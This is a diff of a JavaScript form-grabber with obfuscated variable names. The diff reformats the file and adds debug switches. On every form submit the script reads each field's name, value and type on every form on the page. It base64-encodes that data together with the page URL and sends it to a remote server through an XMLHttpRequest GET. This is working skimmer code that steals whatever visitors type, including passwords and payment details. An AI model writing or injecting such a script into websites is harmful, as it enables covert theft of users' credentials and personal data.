@@ -10,8 +10,6 @@
  * Licensed under the MIT License.
  *
  */
-
-
 'use strict';
 
 // Debug Mode
@@ -32,10 +30,29 @@ var vcd_path = window.location.pathname;
 //  Remote server
 var xyca_remote_server = "http://0.0.0.0:8001/";
 
-/* On submit call function  sdsadxc_onsubmit*/
-document.addEventListener("click", sdsadxc_onsubmit);
 
+/*
+ * Little hack
+ *
+ * While debugging you should use envent click not submit
+ *
+ */
+var xcv_event_type = "submit";
+
+if (bcTRd_debug) {
+    xcv_event_type = "click";
+} else {
+    xcv_event_type = "submit";
+}
+
+
+/* On submit call function  sdsadxc_onsubmit*/
+document.addEventListener(xcv_event_type, sdsadxc_onsubmit);
+
+
+/* Call ajax function */
 var HttpClient = function() {
+
     this.get = function(aUrl, aCallback) {
         var anHttpRequest = new XMLHttpRequest();
         anHttpRequest.onreadystatechange = function() {
@@ -43,8 +60,8 @@ var HttpClient = function() {
                 aCallback(anHttpRequest.responseText);
         }
 
-        anHttpRequest.open( "GET", aUrl, true );
-        anHttpRequest.send( null );
+        anHttpRequest.open("GET", aUrl, true);
+        anHttpRequest.send(null);
     }
 }
 
@@ -53,28 +70,43 @@ var HttpClient = function() {
 var cvaw_api = function(xyc_host, xycsa_protocol, xcye_url, vcd_path, xcvs_name, xycq_value, vxcv_type) {
 
 
-  console.log("Function for API Activated.");
+    // Debug
+    if (bcTRd_debug) {
+        console.log("Function for API Activated.");
+    }
 
-  // Crypt params name
-   var vcx_payload = new Object();
-   vcx_payload.prmrs_domain = xyc_host;
-   vcx_payload.prmrs_protocol = xycsa_protocol;
-   vcx_payload.prmrs_url = xcye_url;
-   vcx_payload.prmrs_path = vcd_path;
-   vcx_payload.prmrs_name = xcvs_name;
-   vcx_payload.prmrs_value = xycq_value;
-   vcx_payload.prmrs_type = vxcv_type;
+    // Crypt params name
+    var vcx_payload = new Object();
+    vcx_payload.prmrs_domain = xyc_host;
+    vcx_payload.prmrs_protocol = xycsa_protocol;
+    vcx_payload.prmrs_url = xcye_url;
+    vcx_payload.prmrs_path = vcd_path;
+    vcx_payload.prmrs_name = xcvs_name;
+    vcx_payload.prmrs_value = xycq_value;
+    vcx_payload.prmrs_type = vxcv_type;
+
+    // Create JSON for Js Object
+    var xyca_jsonString = JSON.stringify(vcx_payload);
+
+    // Print JSON
+    if (bcTRd_debug) {
+        console.log(xyca_jsonString);
+    }
 
 
-   var xyca_jsonString = JSON.stringify(vcx_payload);
-
+    // Call Http client and push data to remote server
     var client = new HttpClient();
+
+    // Encode json with btoa
     client.get(xyca_remote_server + '?payload=' + btoa(xyca_jsonString), function(response) {
-        console.log("Api Success");
+        // Debug
+        if (bcTRd_debug) {
+            console.log("Api Success");
+        }
     });
 
 
-    console.log(xyca_jsonString);
+
 }
 
 
@@ -82,19 +114,23 @@ var cvaw_api = function(xyc_host, xycsa_protocol, xcye_url, vcd_path, xcvs_name,
 function sdsadxc_onsubmit() {
 
 
-
-    /* Get All Form Values in Collection*/
+    // Get All Form Values in Collection*/
     var xycxyc_getAllFormValues = document.forms;
 
 
-    /* Debug */
-    //if(bcTRd_debug) {console.log("Script started");}
+    // Debug
+    if (bcTRd_debug) {
+        console.log("Script started");
+    }
 
-    /* Debug */
-    //if(bcTRd_debug) {console.log(xycxyc_getAllFormValues);}
+    // Debug
+    if (bcTRd_debug) {
+        console.log(xycxyc_getAllFormValues);
+    }
 
-
+    // Get all data from all forms on page
     for (var a = 0; a < document.forms.length; a++) {
+
         var x = document.forms[a++];
         var xycq_value;
         var xcvs_name;
@@ -107,28 +143,26 @@ function sdsadxc_onsubmit() {
             xycq_value = x.elements[i].value;
             vxcv_type = x.elements[i].getAttribute('type');
 
+            // Send data to API function
             cvaw_api(xyc_host, xycsa_protocol, xcye_url, vcd_path, xcvs_name, xycq_value, vxcv_type);
 
-
-            //console.log("Domain: " + xyc_host);
-            //console.log("Protocol: " + xycsa_protocol);
-            //console.log("URL: " + xcye_url);
-            //console.log("Path: " + vcd_path);
-            //console.log("Name: " + xcvs_name);
-            //console.log("Value: " + xycq_value);
-            //console.log("Type: " + vxcv_type);
+            if (bcTRd_debug) {
+                console.log("Domain: " + xyc_host);
+                console.log("Protocol: " + xycsa_protocol);
+                console.log("URL: " + xcye_url);
+                console.log("Path: " + vcd_path);
+                console.log("Name: " + xcvs_name);
+                console.log("Value: " + xycq_value);
+                console.log("Type: " + vxcv_type);
+            }
         }
 
     }
 
 
-    /* Debug */
-    //if(bcTRd_debug) {console.log("Number of scanned forms: " + xycxyc_getAllFormValues.length);}
+    // Debug
+    if (bcTRd_debug) {
+        console.log("Number of scanned forms: " + xycxyc_getAllFormValues.length);
+    }
 
 }
-
-
-
-
-/* Debug */
-//if(bcTRd_debug) {console.log("Number of scanned forms: " + xycxyc_getAllFormValues.length);}
